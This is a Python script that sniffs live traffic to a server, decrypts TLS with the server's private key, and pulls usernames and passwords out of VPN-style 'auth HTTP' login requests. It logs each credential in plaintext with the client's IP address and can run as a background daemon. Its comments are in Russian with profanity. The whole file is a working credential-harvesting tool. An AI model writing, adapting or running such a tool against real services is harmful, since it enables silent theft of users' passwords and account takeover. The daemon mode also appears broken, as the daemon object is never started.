import sys
import pyshark
import logging


def init_loggers(debug, outfile):
    # primary logger
    logger = logging.getLogger("ocacc_log")
    logger.setLevel(logging.DEBUG if debug else logging.INFO)

    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setLevel(logging.DEBUG)
    stream_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)-8s %(message)s"))
    logger.addHandler(stream_handler)

    file_handler = logging.FileHandler("/var/log/ocacc.log")
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)-8s %(message)s"))
    logger.addHandler(file_handler)

    # Out (creds) logger
    out_logger = logging.getLogger("ocacc_out")
    out_logger.setLevel(logging.INFO)
    out_file_handler = logging.FileHandler(outfile)
    out_file_handler.setLevel(logging.DEBUG)
    out_file_handler.setFormatter(logging.Formatter("%(message)s"))
    out_logger.addHandler(out_file_handler)

    return logger, out_logger


def creds_to_loggers(logger, out_logger, field, value, ip):
    logger.info(f"New creds part from {ip}: {field}: {value}")
    out_logger.info(f"{field}: {value}; {ip}")


def main(args):
    logger, out_logger = init_loggers(args.debug, args.outfile)

    # le go
    logger.info("INIT")
    logger.debug("Init pyshark LiveCapture()")
    capture = pyshark.LiveCapture(args.interface,
                                  display_filter=f'ip.dst == {args.ip} and http contains "auth HTTP"',
                                  override_prefs={"ssl.keys_list": f"{args.ip},{args.port},http,{args.keyfile}"})

    logger.info("Starting capture")
    for packet in capture.sniff_continuously():
        logger.debug(f"Login attempt from {packet.ip.src}")

        if "XML" in packet:
            data = [x.strip() for x in str(packet.xml).strip().split('\n')]
            creds_to_loggers(logger, out_logger, data[-5][1:-1].capitalize(), data[-1], packet.ip.src)
        if "URLENCODED-FORM" in packet:
            # Эта залупа висит в иссуях на гитхабе pyshark с 2017 года
            # Я в ахуе сижу ебать
            urlencoded_trash = str(packet.__getattr__("urlencoded-form"))  # Really trash SmileW
            # FUCJ
            if urlencoded_trash.count("<username>"):
                index_1 = urlencoded_trash.index("<username>") + 10
                index_2 = urlencoded_trash.index("</username>")
                creds_to_loggers(logger, out_logger, "Username", urlencoded_trash[index_1:index_2], packet.ip.src)
            elif urlencoded_trash.count("<password>"):
                index_1 = urlencoded_trash.index("<password>") + 10
                index_2 = urlencoded_trash.index("</password>")
                creds_to_loggers(logger, out_logger, "Password", urlencoded_trash[index_1:index_2], packet.ip.src)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--daemon", action="store_true", help="Запуск в режиме демона", default=False)
    parser.add_argument("-i", "--interface", type=str, metavar="interface", help="Интерфейс на котором будет работать tshark", default="eth0")
    parser.add_argument("-I", "--ip", type=str, metavar="ip address", help="IP ардес сервера.", default="0.0.0.0")
    parser.add_argument("-p", "--port", type=int, metavar="port", help="Порт сервера.", default=443)
    parser.add_argument("-k", "--keyfile", type=str, metavar="filename", help="Закрытый ключ сервера")
    parser.add_argument("-o", "--outfile", type=str, metavar="filename", help="Out", default="./ocacc_logged_creds.txt")
    parser.add_argument("--debug", action="store_true", help="loglevel=DEBUG", default=False)
    parsed_args = parser.parse_args()

    if parsed_args.daemon:
        import daemonize
        daemon = daemonize.Daemonize("ocacc", "/run/ocacc.pid",
                                     action=main,
                                     verbose=parsed_args.debug,
                                     privileged_action=lambda: parsed_args)
    else:
        main(parsed_args)
